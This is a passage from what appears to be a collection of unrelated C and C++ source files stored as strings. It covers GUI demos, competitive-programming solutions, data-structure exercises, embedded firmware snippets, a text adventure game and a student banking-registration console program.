strtol(argv[1], NULL, 0);\n    uint16_t note = strtol(argv[2], NULL, 0);\n    uint32_t time = strtol(argv[3], NULL, 0) * SMP_RATE;\n    printf(\"Playing SMP #%d %s ",
    "#include \"Core/Platform.h\"\n#include \"Core/App.h\"\n#include \"Core/Window.h\"\n#include \"Core/Dimension.h\"\n#include \"Core/Interactive.h\"\n\n#include <memory>\n\nusing namespace XenUI;\n\nnamespace {\n    HINSTANCE g_hInst;\n}  // namespace\n\n/// This defines a simple button widget to display on screen.\n/// You can define your own widgets like this or use any of the\n/// built-in widgets found in `Widgets/`\nclass CustomButton final : public IWidget,\n                           public IInteractive {\npublic:\n    CustomButton(const Offset& position,\n                 const Size<f32>& size,\n                 const Color& color,\n                 const str& text,\n                 const std::function<void()>& onPressed)\n        : IWidget(position, size), m_Color(color), m_Text(text), m_OnPressed(onPressed) {}\n    void Draw(Context* context, const Dimension& dim) override {\n        // Draw a cyan-colored rectangle with rounded corners\n        const auto stroke = StrokeProperties(2.f, m_Color);\n        context->DrawRect(GetRect(), m_Color.WithAlpha(0.1f), stroke, true, 8.f);\n        context->DrawString(m_Text, 18.f, m_Position, m_Size, m_Color);\n    }\n\n    void OnPressed() override {\n        m_OnPressed();\n    }\n\nprivate:\n    Color m_Color;\n    str m_Text;\n    std::function<void()> m_OnPressed;\n};\n\nclass DemoApp final : public IApp {\npublic:\n    DemoApp(int width, int height, const std::string& title) : XenUI::IApp(width, height, title) {\n        m_pWindow->SetIcon(\"app.ico\");\n    }\n\n    IWidget* BuildUI(Context* context) override;\n};\n\nIWidget* DemoApp::BuildUI(Context* context) {\n    const auto dim = m_pCanvas->GetDimension();\n\n    const auto onSayHello = [this]() {\n        ::MessageBoxA(m_pWindow->GetHandle(), \"Hello!\", \"XenUI Demo\", MB_OK);\n    };\n    const auto onQuit = [this]() { this->Quit(); };\n\n    const auto sayHelloButton = new CustomButton({dim.Width(50.f), dim.HeightBottom(14.f) - 72.f},\n                                                 {dim.Width(90.f), 52.f},\n                                                 Color(0xFFFF3636),\n                                                 \"Say Hello\",\n                                                 onSayHello);\n\n    const auto quitButton = new CustomButton({dim.Width(50.f), dim.HeightBottom(14.f)},\n                                             {dim.Width(90.f), 52.f},\n                                             Color(0xFF2ac3de),\n                                             \"Quit\",\n                                             onQuit);\n\n    quitButton->AddChild(sayHelloButton);\n\n    return quitButton;\n}\n\nint WINAPI WinMain(_In_ HINSTANCE hInstance,\n                   _In_opt_ HINSTANCE hPrevInstance,\n                   _In_ LPSTR lpCmdLine,\n                   _In_ int nCmdShow) {\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n    g_hInst = hInstance;\n\n    DemoApp demoApp(800, 400, \"XenUI Demo\");\n    demoApp.Run();\n\n    return S_OK;\n}\n",
    "#include \"pe/DbgGui/Windows/Log.h\"\n#include \"al/Base/String.h\"\n#include \"heap/seadHeapMgr.h\"\n#include \"imgui.h\"\n#include \"pe/Util/Log.h\"\n#include <sead/heap/seadHeap.h>\n\nnamespace pe {\nnamespace gui {\n\n    void Log::update()\n    {\n    }\n\n    void Log::draw()\n    {\n        if (getDbgGuiSharedData().showLog) {\n            if (ImGui::Begin(\"Log\", &getDbgGuiSharedData().showLog)) {\n                ImGui::InputText(\"Filter\", mFilter, sizeof(mFilter));\n                ImGui::SetNextWindowSizeConstraints(ImVec2(400, 150), ImVec2(FLT_MAX, FLT_MAX));\n                if (ImGui::BeginChild(\"logthing\", ImVec2(0, 0), true, ImGuiWindowFlags_AlwaysVerticalScrollbar)) {\n                    ImGui::SetScrollY(ImGui::GetScrollMaxY());\n                    for (LogType& type : pe::getLogLines()) {\n                        const char* msg = reinterpret_cast<const char*>(&type) + 1;\n\n                        if (*mFilter && !al::isEqualSubString(msg, mFilter))\n                            continue;\n\n                        switch (type) {\n                        case LogType::Log:\n                            ImGui::Text(\"%s\", msg);\n                            break;\n                        case LogType::Warning:\n                            ImGui::TextColored(ImVec4(1.0, 0.91, 0.18, 1.0), \"%s\", msg);\n                            break;\n                        case LogType::Error:\n                            ImGui::TextColored(ImVec4(0.8, 0.19, 0.19, 1.0), \"%s\", msg);\n                            break;\n                        }\n                    }\n                    ImGui::EndChild();\n                }\n            }\n            ImGui::End();\n        }\n    }\n\n} // namespace gui\n} // namespace pe\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n\n\nint main()\n{\n    cout << \"Hello World!\" << endl;\n    \n    \n   //unordered map doesn't allow dulpicate key -value pair\n   //ordering of keys are not available in\n   //unordered map -insert,search,delete=O(1);\n   //implement by hashing\n   unordered_map<int,int>ms;//first-key\n   //second-value\n   //key must be unique in map\n   //in multimap key may not be unique \n   //value may be duplicat\n   \n   ms.insert(make_pair(20,10));\n   ms.insert(make_pair(20,60));\n   ms.insert(make_pair(20,80));\n   ms.insert(make_pair(20,50));\n   \n   ms.insert(make_pair(30,30));\n   \n   ms.insert(make_pair(40,20));\n   ms.insert(make_pair(50,40));\n  ms[100]=60;//insert or update key-value pair\n   \n    cout << ms.count(10) << endl;//\n    //give no of key(10) present in map\n   ms.insert(make_pair(20,100));\n   \n    for(auto it=ms.begin();it!=ms.end();it++){\n    \n    cout << \"\"<<it->first<<\" \"<<it->second<< endl;}\n     ms.erase(20);//deletion of  key(10) value pair\n    cout << \"Hello World!\" << endl;\n    \n        for(auto it=ms.begin();it!=ms.end();it++){\n    \n    cout << \"\"<<(*it).first<<\" \"<<(*it).second<< endl;}\n    return 0;\n}",
    "#include \"settings.h\"\n\n#include <cstring>\n\n#include \"daisy_seed.h\"\n\n// Storage for the global settings struct\nSettings gSettings;\n\nconst uint32_t signature      = 0xBEDA;\nconst uint32_t latest_version = 2;\n\nvoid SaveSettings(daisy::DaisySeed* seed) {\n  gSettings.signature = signature;\n  gSettings.version   = latest_version;\n\n  seed->qspi_handle.mode = DSY_QSPI_MODE_INDIRECT_POLLING;\n  dsy_qspi_init(&seed->qspi_handle);\n  uint32_t base      = 0x90000000;\n  uint32_t writesize = sizeof(Settings);\n  dsy_qspi_erase(base, base + writesize);\n  dsy_qspi_write(base, writesize, reinterpret_cast<uint8_t*>(&gSettings));\n  dsy_qspi_deinit();\n}\n\nvoid LoadSettings(daisy::DaisySeed* seed) {\n  seed->qspi_handle.mode = DSY_QSPI_MODE_DSY_MEMORY_MAPPED;\n  dsy_qspi_init(&seed->qspi_handle);\n  memcpy(&gSettings, reinterpret_cast<void*>(0x90000000), sizeof(Settings));\n  dsy_qspi_deinit();\n\n  if (gSettings.signature != signature || gSettings.version != latest_version) {\n    // Invalid settings or version mismatch\n    // TODO: upgrade versions\n    memset(&gSettings, 0, sizeof(Settings));\n  }\n}",
    "// https://cses.fi/problemset/task/2205/\r\n#include <bits/stdc++.h>\r\nusing namespace std;\r\n#define endl '\\n'\r\n#define IOS ios::sync_with_stdio(false);cin.tie(nullptr);cout.tie(nullptr);\r\n#define ll long long\r\n#define pb(a) push_back(a)\r\n#define v vector\r\n#define vi v<int>\r\n#define vll v<ll>\r\n#define vb v<bool>\r\n#define vs v<string>\r\n#define vc v<char>\r\n#define vvi v<vi>\r\n#define vvll v<vll>\r\n#define vvc v<vc>\r\n#define bl cout<<endl;\r\n#define all(a) a.begin(),a.end()\r\n#define rall(a) a.rbegin(),a.rend()\r\n#define deb(x) cout << #x << \" : \" << x << endl;\r\n#define pii pair<int,int>\r\n#define pll pair<ll,ll>\r\n#define vpii v<pii>\r\n#define vpll v<pll>\r\n#define fi first\r\n#define se second\r\n#define um unordered_map\r\n#define us unordered_set\r\n#define usi us<int>\r\n#define usll us<ll>\r\nint nCr(int n, int r){if(r>n) return 0;if(n==r) return 1;int ans=1;for(int i=0; i<r; i++){ans*=(n-i);ans/=(i+1);}return ans;}\r\nvb sieve(int n){vb A(n+1,1);for(int i=2; i*i<=n; i++){if(A[i]) for(int j=i*i; j<=n; j+=i) A[j]=0;}return A;}\r\nmap<ll,ll> dp;\r\nll f(ll n){if(dp.count(n)) return dp[n];ll k=n/2;if(n&1) return dp[n] = (f(k)*f(k+1) + f(k-1)*f(k));else return dp[n] = (f(k)*f(k) + f(k-1)*f(k-1));}\r\ntemplate<typename T>istream& operator>>(istream& is, v<T>& v){for(auto& x : v)is >> x;return is;}\r\ntemplate<typename T>ostream& operator<<(ostream& os, v<T>& v){for(auto& x : v)os << x << ' ';return os;}\r\n\r\nstring iob(int n, int k){\r\n    return bitset<32>(n).to_string().substr(32-k);\r\n}\r\nvoid solve(){\r\n    int n;cin>>n;\r\n    int p=(1<<n);\r\n    for(int i=0; i<p; i++) cout<<iob(i^(i/2),n)<<endl;\r\n}\r\nint main(){\r\n    IOS\r\n    //dp[0]=dp[1]=1;\r\n    int t=1;\r\n    // cin>>t;\r\n    while(t--) solve();\r\n}\r\n/*\r\n\r\n*/",
    "#include <iostream>\n#include <stdexcept> \n\nclass Fraction\n{\nprivate:\n    int numerator_;\n    int denominator_;\n\n    void reduce()\n    {\n        int gcd = compute_gcd(numerator_, denominator_);\n        numerator_ /= gcd;\n        denominator_ /= gcd;\n    }\n\n    int compute_gcd(int a, int b) const\n    {\n        while (b != 0)\n        {\n            int t = b;\n            b = a % b;\n            a = t;\n        }\n        return a;\n    }\n\npublic:\n    Fraction(int numerator, int denominator)\n    {\n        if (denominator == 0) {\n            throw std::invalid_argument(\"Denominator cannot be zero\");\n        }\n        numerator_ = numerator;\n        denominator_ = denominator;\n        reduce();\n    }\n\n    bool operator==(const Fraction& other) const\n    {\n        return numerator_ * other.denominator_ == other.numerator_ * denominator_;\n    }\n\n    bool operator!=(const Fraction& other) const\n    {\n        return !(*this == other);\n    }\n\n    bool operator<(const Fraction& other) const\n    {\n        return numerator_ * other.denominator_ < other.numerator_ * denominator_;\n    }\n\n    bool operator<=(const Fraction& other) const\n    {\n        return *this < other || *this == other;\n    }\n\n    bool operator>(const Fraction& other) const\n    {\n        return !(*this <= other);\n    }\n\n    bool operator>=(const Fraction& other) const\n    {\n        return !(*this < other);\n    }\n\n    friend std::ostream& operator<<(std::ostream& os, const Fraction& frac)\n    {\n        os << frac.numerator_ << '/' << frac.denominator_;\n        return os;\n    }\n};\n\nint main()\n{\n    Fraction f1(4, 3);\n    Fraction f2(6, 11);\n\n    std::cout << \"f1\" << ((f1 == f2) ? \" == \" : \" not == \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 != f2) ? \" != \" : \" not != \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 < f2) ? \" < \" : \" not < \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 > f2) ? \" > \" : \" not > \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 <= f2) ? \" <= \" : \" not <= \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 >= f2) ? \" >= \" : \" not >= \") << \"f2\" << '\\n';\n\n    return 0;\n}\n",
    "//include libraries\n#include <iostream>\n#include <string>\n#include <cstdlib>\n#include <thread>\nusing namespace std;\n\nclass Game {\n    private: //private variables\n        int choice;\n        bool havewater = false;\n        bool havecar = false;\n        bool havecarkey = false;\n        int money = 5;\n        bool havefood = false;\n    public:\n        Game() {\n            /*\n            Prompt\n            option 1\n            option 2\n            option 3\n            ...\n            */\n\n            cout << \"Find a dragon\" << endl;\n            cout << \"1. Look for dragon eggs\" << endl;\n            cout << \"2. Go get a car\" << endl;\n            cout << \"3. Go to the highway\" << endl;\n            cout << \"4. Search on the internet (google, mintwiki, etc.)\" << endl;\n            choice = getInput(5);\n\n            if (choice == 1) {\n                dragonEggs();\n            }\n            else if (choice == 2) {\n                getCar();\n            }\n            else if (choice == 3) {\n                gotoHighway();\n            }\n            else if (choice == 4) {\n                searchInternet(\"dragon\");\n            }\n\n            playAgain();\n        }\n    private: //private methods\n        int getInput(int numChoices) {\n            while (true) {\n                string input;\n                cout << \"Select one option from above: \";\n                getline(cin, input);\n\n                try {\n                    int num = stoi(input); //convert 'input' to an int value and save it to 'num'\n                    if (num > 0 && num <= numChoices) {\n                        return num;\n                    }\n                    else {\n                        cout << \"Invaild Value. The value\\'s type has to be \\'int\\' and it should be between 1 and \" + to_string(numChoices) + \". Try again: \" << endl;\n                    }\n                }\n                catch (invalid_argument) {\n                    cout << \"Invaild Value. The value\\'s type has to be \\'int\\' and it should be between 1 and \" + to_string(numChoices) + \". Try again: \" << endl;\n                }\n            }\n        }\n\n        void delay(int dtime) {\n            this_thread::sleep_for(chrono::seconds(dtime));\n        }\n\n        void playAgain() {\n            cout << endl;\n            cout << \"Would you like to play this game again?\" << endl;\n            cout << \"1. Yes!\" << endl;\n            cout << \"2. No.\" << endl;\n            choice = getInput(3);\n\n            if (choice == 1) {\n                cout << \"Play Again: \" << endl;\n                new Game();\n            }\n            else if (choice == 2) {\n                cout << \"Quit Game.\" << endl;\n                exit(0);\n            }\n            else {\n                cout << \"Invaild Vaule. Quit Game.\" << endl;\n                exit(1);\n            }\n        }\n        \n        void notDeveloped() {\n            cout << \"This fuction is not developed yet. Please try again later.\" << endl;\n            exit(1);\n        }\n        \n        void stopAdventure() {\n            cout << \"Stop Adventure\" << endl;\n            exit(0);\n        }\n        \n        void error_message(string error_reason) {\n            cout << \"Something went wrong. If this error keeps happening, you can include the information below and make an issue at https://github.com/jeongjo13/adventure_game/issues/new.\" << endl;\n            cout << error_reason << endl;\n            exit(1);\n        }\n        \n        void dragonEggs() {\n            cout << \"I found some dragon eggs! \" << endl;\n            cout << \"1. Look for dragons\" << endl;\n            cout << \"2. Steal the egg\" << endl;\n            cout << \"3. Stop adventure (Quit Game)\" << endl;\n            choice = getInput(3);\n\n            if (choice == 1) {\n                lookfordragons();\n            }\n            else if (choice == 2) {\n                steal(\"dragonegg\");\n            }\n            else if (choice == 3) {\n                stopAdventure();\n            }\n        }\n\n        void lookfordragons() {\n            cout << \"No dragons around here. Maybe I can look for the other places.\" << endl;\n            cout << \"1. Walk around and look other places\" << endl;\n            cout << \"2. Stop adventure\" << endl;\n            choice = getInput(2);\n\n            if (choice == 1) {\n                lookOtherPlaces();\n            }\n            else if (choice == 2) {\n                cout << \"Stop Adventure\" << endl;\n                exit(0);\n            }\n        }\n        \n        void lookOtherPlaces() {\n            cout << \"I found the dragon! What should I do now?\" << endl;\n            cout << \"1. give some food to the dragon\" << endl;\n            cout << \"2. say \\'hello\\' to the dragon\" << endl;\n            cout << \"3. give some water to the dragon\" << endl;\n            cout << \"4. stop adventure\" << endl;\n            \n            choice = getInput(4);\n            if (choice == 1) {\n                givefood(\"dragon\");\n            }\n            else if (choice == 2) {\n               ",
    "#include <iostream>\r\n#include <string>\r\n#include <cstring>\r\n#include <stdlib.h>\r\n#include <fstream>\r\n#include <cstdlib>\r\n#include<windows.h>\r\n#include <limits>\r\n#include <vector>\r\n#include <sstream>\r\nusing namespace std;\r\ntemplate <class T>\r\nbool InputCheck(T &A){\r\n        while(cin.fail())\r\n        {\r\n            cin.clear();\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            cout<<\"                           Invalid Input Try Again \";\r\n            cin >> A;\r\n        }\r\n        return true;\r\n}\r\nvoid gotoRowCol(int rpos, int cpos);\r\nclass Registration {\r\npublic:\r\n    string Account_name;\r\n    string name;\r\n    string father_name;\r\n    int age;\r\n    unsigned long long CNIC;\r\n    string email;\r\n    string gender;\r\n    string country;\r\n    string province;\r\n    string district;\r\n    string tehsil;\r\n    unsigned long long phone_num;\r\n    string password;\r\n    string confirm_password;\r\n    double cash;\r\n    string currency;\r\n    double cash_pkr;\r\npublic:\r\n    Registration() : cash_pkr(0) {}\r\n    Registration( Registration &reg )\r\n    {\r\n        Account_name = reg.Account_name;\r\n        name = reg.name;\r\n        father_name = reg.father_name;\r\n        age = reg.age;\r\n        CNIC = reg.CNIC;\r\n        email = reg.email;\r\n        gender = reg.gender;\r\n        country = reg.country;\r\n        province = reg.province;\r\n        district = reg.district;\r\n        tehsil = reg.tehsil;\r\n        phone_num = reg.phone_num;\r\n        password = reg.password;\r\n        confirm_password = reg.confirm_password;\r\n        cash = reg.cash;\r\n        currency = reg.currency;\r\n        cash_pkr = reg.cash_pkr;\r\n    }\r\n    bool validaccount(string &A)\r\n    {\r\n        if (A== \"EASYPAISA\" || A == \"JAZZCASH\" || A== \"NAYAPAY\" || A== \"SADAPAY\" || A== \"HBL\" || A == \"UBL\"\r\n            || A==\"easypaisa\" || A==\"Easypaisa\" || A==\"Jazzcash\" || A==\"jazzcash\" || A==\"Nayapay\" || A==\"Sadapay\" ||\r\n            A==\"nayapay\" || A==\"sadapay\" || A==\"hbl\" || A==\"ubl\" || A==\"Hbl\" || A==\"Ubl\")\r\n            return true;\r\n        else\r\n            return false;\r\n    }\r\n    bool validpassword() {\r\n        return (password == confirm_password);\r\n    }\r\n\r\n    bool validcnic() {\r\n        return (CNIC >= 1000000000000 && CNIC <= 9999999999999);\r\n    }\r\n    bool validage() {\r\n        return (age >= 18);\r\n    }\r\n    bool Register() {\r\n        gotoRowCol(13,61);\r\n        cout << \"Create Account\"<<endl;\r\n        gotoRowCol(14,61);\r\n        cout<<\"EasyPaisa  Jazzcash NayaPay SadaPay HBL UBL:\";\r\n        cin >> Account_name;\r\n        while(validaccount(Account_name)==false)\r\n            {\r\n                gotoRowCol(13,61);\r\n                cout << \"Account Name not Valid Try Again: \";\r\n                gotoRowCol(14,61);\r\n                cout << \"Choices: \";\r\n                gotoRowCol(15,61);\r\n                cout<< \"EasyPaisa  Jazzcash  NayaPay SadaPay HBL UBL:\";\r\n                cin >> Account_name;\r\n            }\r\n\r\n        system(\"cls\");\r\n        cout<<\"\\n                           Create Your \" << Account_name <<\" Account\"<<endl;\r\n        cout<<\"                           ----------------------------\\n\\n\";\r\n        cout << \"                           Name : \";\r\n        cin >> name;\r\n        cout << \"                           Father Name : \";\r\n        cin>>father_name;\r\n        ifstream regis(\"info.txt\");\r\n        string s;\r\n        while(regis>>s)\r\n        {\r\n            if(s==name)\r\n            {\r\n                cout<<\"                           Sorry!!! You can't Create Account You have Already Account \"<<endl;\r\n                return false;\r\n            }\r\n        }\r\n        ofstream reg(\"info.txt\");\r\n        reg<<\"Account_Name : \"<<Account_name<<endl;\r\n        reg<<\"Name : \"<<name<<endl;\r\n        reg<<\"Father_Name : \"<<father_name<<endl;\r\n        cout << \"                           Age : \";\r\n        cin >> age;\r\n        InputCheck(age);\r\n        while(validage()==false)\r\n            {\r\n                cout << \"                           Sorry! Your Age is Less Than 18 So You can't Create Account! Try Again \" << endl;\r\n                cout << \"                           Age : \";\r\n                cin >> age;\r\n            }\r\n        reg<<\"Age : \"<<age<<endl;\r\n        cout << \"                           CNIC : \";\r\n        cin >> CNIC;\r\n        InputCheck(CNIC);\r\n        while(validcnic()==false)\r\n            {\r\n                cout << \"                              Sorry! Your CNIC is not Valid Please Enter 13 digits! Try Again: \" << endl;\r\n                cout << \"                           CNIC : \";\r\n                cin >> CNIC;\r\n            }\r\n        reg<<\"CNIC : \"<<CNIC<<endl;\r\n        cout << \"                           Email : \";\r\n        cin >> email;\r\n        reg<<\"Email : \"<<email<<endl;\r\n        cout << \"                           Gender : ( Male , Female , Transgender ) \";\r\n        cin >> gender;\r\n        reg<<\"Gender : \"<<gender<<endl;\r\n        cout << \"                           Country : \";\r\n        cin >> country;\r\n        r",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <Esp.h>\n#include \"secrets.h\"\n\nWiFiClient Client;\n\nconst char *WiFiSSID = SECRET_WIFI_SSID;\nconst char *WiFiPass = SECRET_WIFI_PASS;\n\nvoid setup(){\n    Serial.begin(115200);\n    Serial.println(\"Initializing...\");\n\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(WiFiSSID, WiFiPass);\n}\n\nbool isTimeToExecute(uint32_t &lastTime, uint32_t interval){\n    uint32_t currentTime = millis();\n    if ((currentTime - lastTime) >= interval || currentTime < lastTime){\n        lastTime = currentTime;\n        return true;\n    }\n    return false;\n}\n\nvoid loop(){\n    static uint32_t lastPrintTime = 0;\n\n\n    if (WiFi.status() != WL_CONNECTED){\n        if (WiFi.status() == WL_CONNECT_FAILED){\n            WiFi.disconnect();\n            WiFi.begin(WiFiSSID, WiFiPass);\n            Serial.print(\"WiFi connection failed\");\n        }\n        Serial.println(\"Trying to connect to WiFi...\");\n        delay(500);\n    }else{\n        if (isTimeToExecute(lastPrintTime, 100)){\n            Serial.println(millis());\n            \n            uint32_t rand = 0;//esp_random();\n            neopixelWrite(RGB_BUILTIN, rand&0xFF, (rand>>8) & 0xFF, (rand>>16) & 0xFF);\n        }\n    }\n}",
    "/*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\r\n$$                                                                                          $$              \r\n$$ PROJECT NAME : Customized Standard Template Data Structure Library                       $$\r\n$$                     (Linear and Non-Linear Data Structures)                              $$\r\n$$                                                                                          $$\r\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\r\n$$                                                                                          $$        \r\n$$      CONTENTS     : [1] Class SingyLL                                                    $$\r\n$$                     [2] Class DoublyLL                                                   $$\r\n$$                     [3] Class SinglyCircular                                             $$\r\n$$                     [4] Class Doubly Circular                                            $$\r\n$$                     [5] Class Stack                                                      $$\r\n$$                     [6] Class Queue                                                      $$\r\n$$                     [7] Class BinarySearchTree                                           $$\r\n$$                                                                                          $$\r\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                      \r\n*/\r\n#include<iostream>\r\n#include<stdlib.h>\r\nusing namespace std;\r\n\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\n//\r\n//    Class Name  :  SinglyLL [Singly Linear Linked List] \r\n// \r\n//    Description :  It is a Generic Singly Linear Linked List Data Structure     \r\n//                              \r\n//    Author      :  Navnath Jadhav\r\n//\r\n//\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\ntemplate <class T>\r\nstruct node\r\n{\r\n    node <T> *next;\r\n    T data;\r\n};\r\n\r\ntemplate <class T>\r\nclass SinglyLL\r\n{\r\n    private:\r\n        node<T>* first;\r\n        int size;      \r\n\r\n    public:\r\n        SinglyLL();\r\n        void InsertFirst(T);\r\n        void InsertLast(T);\r\n        void InsertAtPos(T,int);\r\n\r\n        void DeleteFirst();\r\n        void DeleteLast();\r\n        void DeleteAtPos(int);\r\n\r\n        void Display();\r\n        int Count();\r\n};\r\n\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\n//\r\n//    Class Name  :  DoublyLL [Doubly Linear Linked List] \r\n// \r\n//    Description :  It is a Generic Doubly Linear Linked List Data Structure     \r\n//                              \r\n//    Author      :  Navnath Jadhav\r\n//\r\n//    Date        :  1 jan 2023\r\n//\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\ntemplate <class T>\r\nstruct dnode\r\n{\r\n    int data;\r\n    struct dnode<T>* next;\r\n    struct dnode<T>* prev;\r\n\r\n};\r\n\r\ntemplate <class T>\r\nclass DoublyLL\r\n{\r\n    private:\r\n        dnode<T>* first;\r\n        int size;\r\n\r\n    public:\r\n\r\n        DoublyLL();\r\n        void InsertFirst (T);\r\n        void InsertLast (T);\r\n        void InsertAtPos (T, int);\r\n\r\n        void DeleteFirst ();\r\n        void DeleteLast ();\r\n        void DeleteAtPos (int);\r\n\r\n        int Count ();\r\n        void Display ();\r\n};\r\n\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\n//\r\n//    Class Name  :  SinglyCircular [Singly Circular Linked List] \r\n// \r\n//    Description :  It is a Generic Singly Circular Linked List Data Structure     \r\n//                              \r\n//    Author      :  Navnath Jadhav\r\n//\r\n//    Date        :  1 jan 2023\r\n//\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\ntemplate <class T>\r\nstruct scnode\r\n{\r\n    T data;\r\n    struct scnode<T>* next;\r\n\r\n};\r\n\r\ntemplate <class T>\r\nclass SinglyCircular\r\n{\r\n    private:\r\n        scnode<T>* first;\r\n        scnode<T>* last;\r\n        int size;\r\n\r\n    public:\r\n        SinglyCircular();\r\n        void Display();\r\n        int Count();\r\n        void InsertFirst(T Data);\r\n        void InsertLast(T Data);\r\n        void InsertAtPos(T, int);\r\n        void DeleteFirst();\r\n        void DeleteLast();\r\n        void DeleteAtPos(int);\r\n\r\n};\r\n\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\n//\r\n//    Class Name  :  DoublyCircular [Doubly Circular Linked List] \r\n// \r\n//    Description :  It is a Generic Doubgly Circular Linked List Data Structure     \r\n//                              \r\n//    Author      :  Navnath Jadhav\r\n//\r\n//    Date        :  1 jan 2023\r\n//\r\n//////////////////////////////////////////////////////////////////////////////////////////////\r\ntemplate <class T>\r\nstruct dcnode\r\n{\r\n    T data;\r\n    struct dcnode<T>",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"forms_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//Program: In the below given program we learn about the concept of upcasting , downcasting , which  is achieved through dynamic memory allocation of memory. Upcasting -> when a small quantity points out to the larger quantity the nit is known as upcasting .\r\n//Downcasting -> when a larger quantity points out the smaller quantity the it is known as the downcasting \r\n\r\n\r\n#include<iostream>\r\nusing namespace std;\r\nclass Base\r\n{\r\n\tpublic:\r\n\t\r\n\t         int a , b;\r\n\r\nvoid fun()\r\n{\r\ncout<<\"Inside Base fun\"<<\"\\n\";\r\n}\r\n\r\n};\r\n\r\nclass Derrived: public Base \r\n{\r\npublic :\r\n\r\n            int x , y;\r\n\r\nvoid gun()\r\n{\r\ncout<<\"Inside Derrived gun\"<<\"\\n\";\r\n}\r\n\r\n};\r\n\r\nint main()\r\n{\r\nchar ch = 'A';  \r\nint no = 11;\r\nchar*cp1 = & ch; //char -> char //No casting\r\n\r\nint*ip2 = & no ; //int -> int //No casting\r\n\r\nchar*cp2 = (char*)& no; //char -> int (upcasting)\r\n\r\n//int*ip2 = (int*)&ch; //int -> char (downcasting)\r\n\r\nBase* bp1 = new Base(); //Base -> Base   //No casting\r\n\r\nDerrived*dp1 = new Derrived(); //Derrived -> Derrived  //No casting\r\n\r\nBase*bp2 = new Derrived(); //Base -> Derrived (upcasting)\r\n\r\n//Derrived*dp2 = new Base(); //Derrived -> Base (downcasting)\r\n\r\nreturn 0;\r\n}\t",
    "#include<bits/stdc++.h>\n\nusing namespace std ;\n\nconst int N=1e5+2;\n\nint a[N],tree[4*N];\n\n\nvoid build(int node,int st,int en){//node==index of node\n\nif(st==en){\ntree[node]=a[st];\n\nreturn ;\n}//base case\n\nint mid=(st+en)/2;\n\nbuild(2*node,st,mid);//left child\nbuild(2*node+1,mid+1,en);//right child \n\ntree[node]=max(tree[2*node],tree[2*node+1]);\n\n\n}\n\n\n\nint query(int node,int st,int en,int l,int r){\n\nint mid=(st+en)/2;\n//partial overlaping\n//return tree[node];\n\n\nif(st>r || en<l){ return INT_MIN;}\n\n\nif(st>=l&&en<=r){//complete overlaping\nreturn tree[node];\n\n\n\n}\n\n\nint q1=query(2*node, st,mid, l, r);\n\nint q2=query(2*node+1,mid+1,en, l, r);\n return max(q1,q2);\n }\n\nint main() \n{\n    \n    int n;\n    \n    //cin>>n;\n    cout << \"enter the size of array: \" << endl;\n    cin>>n;\n    cout << \"enter the elements of array: \" << endl;\n    for(int i=0;i<n;i++){\n    cin>>a[i];\n    \n    }\n    \n    build(1,0,n-1);\n    \n    \n    while(1){\n    cout << \"if u want to break the loop press -1\" << endl;\n    int x;\n    cin>>x;\n    if(x==-1){break;}\n    else{\n    int l,r;\n    \n    cout << \"enter the range of query l and r: \" << endl;\n    \n    \n    cin>>l>>r;\n    \n    \n    cout<< query(1,0,n-1,l,r)<<endl;\n    \n    }}\n    //cout << \" \"<<tree[n/2] << endl;\n    cout << \"tree is \" << endl;\n    //for(int i=0;i<=n;i++){\n    \n    //cout << i<<\"->\"<<tree[i] << endl;\n    //}\n    \n    \n    \n    \n    return 0;\n}",
